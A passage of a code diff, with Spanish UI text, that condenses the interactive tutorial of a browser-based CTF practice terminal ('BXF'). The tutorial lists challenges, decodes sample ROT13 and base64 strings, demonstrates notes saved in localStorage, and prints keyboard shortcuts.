-        sample.forEach(([id,cat,diff,title]) => term.writeln(`  \x1b[36m${id.padEnd(8)}\x1b[0m \x1b[34m${cat.padEnd(10)}\x1b[0m \x1b[32m${diff.padEnd(8)}\x1b[0m  ${title}`));
-        term.writeln('  \x1b[90m... y muchos más\x1b[0m');
-        await sleep(600);
-
-        // ── 4. solve demo ──
-        await section('4/8 — Walkthrough de reto (S1M02 — Ancient Cipher)');
-        term.writeln(`${C}Para obtener ayuda de cualquier reto, usa solve:${R}`);
-        await sleep(300);
-        await typeCmd('solve S1M02');
-        term.writeln(`${M}╭─────────────────────────────────────────────────────────────╮${R}`);
-        term.writeln(`${M}│${R}  \x1b[1mS1M02\x1b[0m — \x1b[36mAncient Cipher\x1b[0m`);
-        term.writeln(`${M}│${R}  Category: \x1b[34mCrypto\x1b[0m  Difficulty: \x1b[32mEasy\x1b[0m  Points: \x1b[33m50\x1b[0m`);
-        term.writeln(`${M}╰─────────────────────────────────────────────────────────────╯${R}`);
-        term.writeln(`${Y}💡 HINT:${R} ROT13 shifts each letter by 13 positions`);
+        pl(`${M}┌────────────────────────────────────────────────┐${R}`);
+        pl(`${M}│${R}  BXF CTF — 44 challenges  (S0 + S1)            ${M}│${R}`);
+        pl(`${M}└────────────────────────────────────────────────┘${R}`);
+        [['S1M01','Web','Easy','The Unseen Path'],['S1M02','Crypto','Easy','Ancient Cipher'],['M13','Crypto','Medium','Shattered RSA']].forEach(([id,cat,d,t])=>
+            term.writeln(`  \x1b[36m${id.padEnd(8)}\x1b[0m \x1b[34m${cat.padEnd(10)}\x1b[0m \x1b[32m${d.padEnd(8)}\x1b[0m  ${t}`)
+        );
+        term.writeln('  \x1b[90m... y 41 más. Escribe: challenges\x1b[0m');
         await sleep(500);
 
-        // ── 5. Crypto demo ──
-        await section('5/8 — Herramientas de criptografía');
-        term.writeln(`${C}Prueba herramientas crypto directamente:${R}`);
-        await sleep(300);
+        await sec('4/6 — Herramientas crypto');
         await typeCmd('rot13 "cvs{ebg13_vf_pynffvp}"');
-        const rot13Result = 'cvs{ebg13_vf_pynffvp}'.replace(/[a-zA-Z]/g, c => {
-            const b = c <= 'Z' ? 65 : 97;
-            return String.fromCharCode((c.charCodeAt(0) - b + 13) % 26 + b);
-        });
-        pl(`\x1b[32m${rot13Result}\x1b[0m`);
-        await sleep(400);
-
-        await typeCmd('hash sha256 "hola"');
-        pl(`\x1b[90msha256:\x1b[0m \x1b[33m0f9c... (calculando via Web Crypto API)\x1b[0m`);
-        await sleep(400);
-
+        const r13='cvs{ebg13_vf_pynffvp}'.replace(/[a-zA-Z]/g,c=>{const b=c<='Z'?65:97;return String.fromCharCode((c.charCodeAt(0)-b+13)%26+b);});
+        pl(`\x1b[32m${r13}\x1b[0m`);
+        await sleep(300);
         await typeCmd('base64 -d "YnhmezE="');
-        try {
-            pl(`\x1b[32m${atob('YnhmezE=')}\x1b[0m`);
-        } catch(e) { pl('bxf{1}'); }
+        try{pl(`\x1b[32m${atob('YnhmezE=')}\x1b[0m`);}catch(e){pl('bxf{1}');}
         await sleep(400);
 
-        // ── 6. HTTP tools ──
-        await section('6/8 — Herramientas HTTP (curl real)');
-        term.writeln(`${C}curl hace peticiones HTTP reales al servidor:${R}`);
-        await sleep(300);
-        await typeCmd('curl https://httpbin.org/get -H "X-CTF: testing"');
-        term.writeln(`\x1b[90m[enviando petición real...]\x1b[0m`);
-        term.writeln(`\x1b[36m{\x1b[0m "headers": { "X-Ctf": "testing" }, "url": "https://httpbin.org/get" \x1b[36m}\x1b[0m`);
-        await sleep(500);
-
-        // ── 7. Notas persistentes ──
-        await section('7/8 — Notas persistentes (sobreviven al cerrar el navegador)');
-        term.writeln(`${C}Guarda notas que duran entre sesiones:${R}`);
-        await sleep(300);
-        await typeCmd('echo "Flag encontrada: bxf{test_123}" >> notes.txt');
-        if (!VFILES['notes.txt']) VFILES['notes.txt'] = ['# My CTF Notes'];
-        VFILES['notes.txt'].push('Flag encontrada: bxf{test_123}');
+        await sec('5/6 — Notas persistentes entre sesiones');
+        await typeCmd('echo "Mi primera flag: bxf{test}" >> notes.txt');
+        if(!VFILES['notes.txt'])VFILES['notes.txt']=['# My CTF Notes'];
+        VFILES['notes.txt'].push('Mi primera flag: bxf{test}');
         _saveVFiles();
         pl('Appended to notes.txt');
         await sleep(300);
         await typeCmd('cat notes.txt');
-        VFILES['notes.txt'].forEach(l => term.writeln(l));
-        await sleep(400);
+        VFILES['notes.txt'].forEach(l=>term.writeln(l));
         term.writeln('');
-        term.writeln(`${G}✔ Tus notas se guardan en localStorage${R} — estarán aquí aunque cierres el navegador.`);
-        term.writeln(`${G}✔ También se guarda:${R} historial de comandos (↑↓), variables de entorno (set), archivos propios.`);
-        await sleep(600);
+        term.writeln(`${G}✔ Los archivos se guardan en localStorage — persisten al cerrar el navegador${R}`);
+        await sleep(500);
 
-        // ── 8. Comandos útiles ──
-        await section('8/8 — Más comandos útiles');
-        term.writeln(`${C}Resumen de lo más importante:${R}`);
-        await sleep(200);
-        const tips = [
-            [`${C}TAB${R}`, 'Autocompletado de comandos'],
-            [`↑↓`, 'Historial de comandos'],
-            [`${Y}Ctrl+L${R}`, 'Limpiar pantalla (o "clear")'],
-            [`${Y}Ctrl+C${R}`, 'Cancelar comando en curso'],
-            [`${C}history${R}`, 'Ver todos los comandos usados'],
-            [`${C}env${R}`, 'Ver variables de entorno'],
-            [`${C}set TARGET=https://...${R}`, 'Definir variable de entorno'],
-            [`${C}tutorial${R}`, 'Volver a ver este tutorial'],
-            [`${C}reset-session${R}`, 'Borrar datos guardados y empezar de cero'],
-        ];
-        for (const [cmd, desc] of tips) {
-            await sleep(80);
-            term.writeln(`  ${cmd.padEnd(30)} \x1b[90m${desc}\x1b[0m`);
-        }
-
-        await sleep(400);
+        await sec('6/6 — Atajos de teclado');
+        [['TAB','Autocompletar comandos'],['↑↓','Historial de comandos'],['Ctrl+L','Limpiar pantalla'],['challenges','Listar retos'],['solve <ID>','Walkthrough paso a paso'],['tutorial','Repetir este tutorial'],['reset-session','Borrar datos guardados']].forEach(([k,v])=>
+            term.writeln(`  \x1b[36m${k.padEnd(18)}\x1b[0m \x1b[90m${v}\x1b[0m`)
+        );
+        await sleep(300);
         term.writeln('');
-        term.writeln(`${M}══════════════════════════════════════════════════════════════${R}`);
-        term.writeln(`${G}\x1b[1m¡Tutorial completado!${R}  Ya eres un operador de la terminal BXF.`);
-        term.writeln(`${C}Empieza con:${R}  \x1b[33mchallenges\x1b[0m  →  \x1b[33msolve S1M02\x1b[0m  →  \x1b[33mrot13 "cvs{ebg13_vf_pynffvp}"\x1b[0m`);
-        term.writeln(`${M}══════════════════════════════════════════════════════════════${R}`);
+        term.writeln(`${M}══════════════════════════════════════════════════════${R}`);
+        term.writeln(`${G}\x1b[1m¡Tutorial completado!\x1b[0m  Empieza con: \x1b[33msolve S1M02\x1b[0m`);
+        term.writeln(`${M}══════════════════════════════════════════════════════${R}`);
         term.writeln('');
         pendingAsync = false;
         term.write(PROMPT);
     }
 
-    function termResetSession() {
-        const keys = ['bxf_env','bxf_vfiles','bxf_term_tut_v1','bxf_flags'];
-        keys.forEach(k => localStorage.removeItem(k));
-        // Keep history
-        pl('\x1b[33mSession data cleared:\x1b[0m env vars, custom files, tutorial flag.');
-        pl('\x1b[90m(Command history preserved. Reload to see first-time tutorial again.)\x1b[0m');
-    }
 
-    function termClear() { term.write('\x1b[2J\x1b[H'); term.write(PROMPT); }
-
-    // Clock
-    setInterval(()=>{const e=document.getElementById('status-time');if(e)e.textContent=new Date().toLocaleTimeString();},1000);
+        setInterval(()=>{const e=document.getElementById('status-time');if(e)e.textContent=new Date().toLocaleTimeString();},1000);
 
     // ── Nebula Canvas Animation ──
     (function() {
